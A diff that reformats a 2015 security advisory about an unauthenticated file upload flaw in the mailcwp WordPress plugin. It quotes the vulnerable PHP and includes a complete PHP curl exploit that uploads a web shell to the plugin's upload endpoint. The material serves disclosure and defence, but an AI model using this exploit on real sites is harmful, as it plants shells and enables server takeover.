@@ -1,49 +1,57 @@
-                                Advisory #: 138
-Title: Remote file upload vulnerability in mailcwp v1.99 wordpress plugin
-Author:Larry W. Cashdollar, @_larry0
-Date: 2015-07-09
-Download Site: https://wordpress.org/plugins/mailcwp/
-Vendor:CadreWorks Pty Ltd
-Vendor Notified: 2015-07-09
-Vendor Contact: Contact Page via WP site
-Description: MailCWP, Mail Client for WordPress. A full-featured mail client
-plugin providing webmail access through your WordPress blog or website.
-Vulnerability:
-The code in mailcwp-upload.php doesn't check that a user is authenticated or
-what type of file is being uploaded any user can upload a shell to the target
-wordpress server: 2 $message_id = $_REQUEST["message_id"]; 3 $upload_dir =
-$_REQUEST["upload_dir"]; . . 8 $fileName = $_FILES["file"]["name"]; 9
-move_uploaded_file($_FILES["file"]["tmp_name"], "$upload_dir/$message_id-
-$fileName"); Exploitation requires the attacker to guess a writeable location
-in the http server root.
-CVE-2015-1000000
-JSON:Export
-Exploit Code:
-   1. <?php
-   2. /*Larry W. Cashdollar @_larry0
-   3. Exploit for mailcwp v1.99 shell will be called 1-shell.php.
-   4. 7/9/2015
-   5. */
-   6.         $target_url = 'http://www.example.com/wp-content/plugins/mailcwp/
-      mailcwp-upload.php?message_id=1&upload_dir=/usr/share/wordpress/wp-
-      content/uploads';
-   7.         $file_name_with_full_path = '/var/www/shell.php';
-   8.  
-   9.         echo "POST to $target_url $file_name_with_full_path";
-  10.         $post = array('file' =>
-      'shell.php','file'=>'@'.$file_name_with_full_path);
-  11.  
-  12.         $ch = curl_init();
-  13.         curl_setopt($ch, CURLOPT_URL,$target_url);
-  14.         curl_setopt($ch, CURLOPT_POST,1);
-  15.         curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
-  16.         curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
-  17.         $result=curl_exec ($ch);
-  18.         curl_close ($ch);
-  19.         echo "<hr>";
-  20.         echo $result;
-  21.         echo "<hr>";
-  22. ?>
-  23.  
-Screen Shots:
-Advisory: http://www.vapidlabs.com/advisory.php?v=138
+
+                               Advisory #: 138
+
+   Title: Remote file upload vulnerability in mailcwp v1.99 wordpress
+   plugin
+   Author: Larry W. Cashdollar, @_larry0
+   Date: 2015-07-09
+   Download Site: https://wordpress.org/plugins/mailcwp/
+   Vendor: CadreWorks Pty Ltd
+   Vendor Notified: 2015-07-09
+   Vendor Contact: Contact Page via WP site
+   Description: MailCWP, Mail Client for WordPress. A full-featured mail
+   client plugin providing webmail access through your WordPress blog or
+   website.
+   Vulnerability:
+   The code in mailcwp-upload.php doesn't check that a user is
+   authenticated or what type of file is being uploaded any user can
+   upload a shell to the target wordpress server: 2 $message_id =
+   $_REQUEST["message_id"]; 3 $upload_dir = $_REQUEST["upload_dir"]; . . 8
+   $fileName = $_FILES["file"]["name"]; 9
+   move_uploaded_file($_FILES["file"]["tmp_name"],
+   "$upload_dir/$message_id-$fileName"); Exploitation requires the
+   attacker to guess a writeable location in the http server root.
+   CVE-2015-1000000
+   JSON: Export
+   Exploit Code:
+
+    1. <?php
+    2. /*Larry W. Cashdollar @_larry0
+    3. Exploit for mailcwp v1.99 shell will be called 1-shell.php.
+    4. 7/9/2015
+    5. */
+    6. $target_url =
+       'http://www.example.com/wp-content/plugins/mailcwp/mailcwp-upload.p
+       hp?message_id=1&upload_dir=/usr/share/wordpress/wp-content/uploads'
+       ;
+    7. $file_name_with_full_path = '/var/www/shell.php';
+    8.
+    9. echo "POST to $target_url $file_name_with_full_path";
+   10. $post = array('file' =>
+       'shell.php','file'=>'@'.$file_name_with_full_path);
+   11.
+   12. $ch = curl_init();
+   13. curl_setopt($ch, CURLOPT_URL,$target_url);
+   14. curl_setopt($ch, CURLOPT_POST,1);
+   15. curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+   16. curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+   17. $result=curl_exec ($ch);
+   18. curl_close ($ch);
+   19. echo "<hr>";
+   20. echo $result;
+   21. echo "<hr>";
+   22. ?>
+   23.
+
+   Screen Shots:
+   Advisory: http://www.vapidlabs.com/advisory.php?v=138
